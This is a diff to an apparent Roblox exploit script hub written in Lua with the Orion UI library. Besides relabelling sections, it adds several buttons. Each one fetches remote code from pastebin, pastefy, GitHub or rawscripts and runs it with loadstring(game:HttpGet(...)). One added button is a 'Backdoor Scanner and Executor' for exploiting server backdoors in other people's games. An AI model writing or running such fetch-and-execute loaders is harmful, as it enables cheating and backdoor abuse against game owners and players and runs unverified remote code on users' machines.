@@ -124,7 +124,7 @@ local Tab = Window:MakeTab({
 })
 
 local Section = Tab:AddSection({
-    Name = "Admin Panel"
+    Name = "[Admin Panel]"
 })
 
 Tab:AddParagraph("--> Admin Panel <--","Total Panel : 10")
@@ -459,7 +459,7 @@ local Tab = Window:MakeTab({
 })
 
 local Section = Tab:AddSection({
-    Name = "Script"
+    Name = "[Script]"
 })
 
 Tab:AddParagraph("-- > Script <--","Not Fe Bypasser")
@@ -1424,6 +1424,19 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
+    Name = "Steve",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Test4267/steve/refs/heads/main/rare"))()
+        OrionLib:MakeNotification({
+            Name = "Projects Cookies 🍪 || Creator Message🌐",
+            Content = "Successfully executed!",
+            Image = "rbxassetid://7733993369",
+            Time = 3
+        })
+    end    
+})
+
+Tab:AddButton({
     Name = "Scout (Epic)",
     Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/uUbCANas"))();
@@ -1765,6 +1778,19 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
+    Name = "You're Idiot Roast",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SS-6vmzz-Executor-38106"))()
+        OrionLib:MakeNotification({
+            Name = "Projects Cookies 🍪 || Creator Message🌐",
+            Content = "Successfully executed!",
+            Image = "rbxassetid://7733993369",
+            Time = 3
+        })
+    end    
+})
+
+Tab:AddButton({
     Name = "Toad Roast",
     Callback = function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/TOAD-roast-Script-21462"))()
@@ -1867,6 +1893,7 @@ Tab:AddButton({
         })
     end    
 })
+
 Tab:AddParagraph("-- > Gui <--","Not Fe Bypasser")
 Tab:AddLabel("Total Gui : 24")
 Tab:AddLabel("Status : 🟢")
@@ -2825,6 +2852,19 @@ Tab:AddButton({
     Name = "Patrick Tools Kit",
     Callback = function()
         loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
+        OrionLib:MakeNotification({
+            Name = "Projects Cookies 🍪 || Creator Message🌐",
+            Content = "Successfully executed!",
+            Image = "rbxassetid://7733993369",
+            Time = 3
+        })
+    end    
+})
+
+Tab:AddButton({
+    Name = "Meme Tools v3",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/pbp6UVjW"))()
         OrionLib:MakeNotification({
             Name = "Projects Cookies 🍪 || Creator Message🌐",
             Content = "Successfully executed!",
@@ -4293,13 +4333,13 @@ local Tab = Window:MakeTab({
 })
 
 local Section = Tab:AddSection({
-    Name = "Emote/Dance (New)"
+    Name = "[Emote/Dance] (New)"
 })
 
-Tab:AddParagraph("-- > Emote/Dance <--","So Epic LOL")
+Tab:AddParagraph("-- > Emote/Dance <--","Please ignore it, because it still development")
 Tab:AddLabel("Total Emote/Dance : 3")
-Tab:AddLabel("Status : 🟢")
-Tab:AddParagraph("Correct Emote/Dance Working : 3 🟢","Correct Emote/Dance Not Working : 0 🔴")
+Tab:AddLabel("Status : 🔴")
+Tab:AddParagraph("Correct Emote/Dance Working : 1 🟢","Correct Emote/Dance Not Working : 2 🔴")
 
 Tab:AddButton({
     Name = "Pog Dance (Epic)",
@@ -4348,7 +4388,7 @@ local Tab = Window:MakeTab({
 })
 
 local Section = Tab:AddSection({
-    Name = "Hub"
+    Name = "[Hub]"
 })
 
 Tab:AddParagraph("-- > Hub <--","Credits To Owner of This Hub")
@@ -4989,6 +5029,19 @@ Tab:AddButton({
     Name = "Frakture SS (Backdoor Scanner and Executor)",
     Callback = function()
         loadstring(game:HttpGet('https://pastefy.app/edMe7Bwx/raw'))()
+        OrionLib:MakeNotification({
+            Name = "Projects Cookies 🍪 || Creator Message🌐",
+            Content = "Successfully executed!",
+            Image = "rbxassetid://7733993369",
+            Time = 3
+        })
+    end    
+})
+
+Tab:AddButton({
+    Name = "Backdoor Legacy (Backdoor Scanner and Executor)",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/IPCeg4IH/raw"))() 
         OrionLib:MakeNotification({
             Name = "Projects Cookies 🍪 || Creator Message🌐",
             Content = "Successfully executed!",
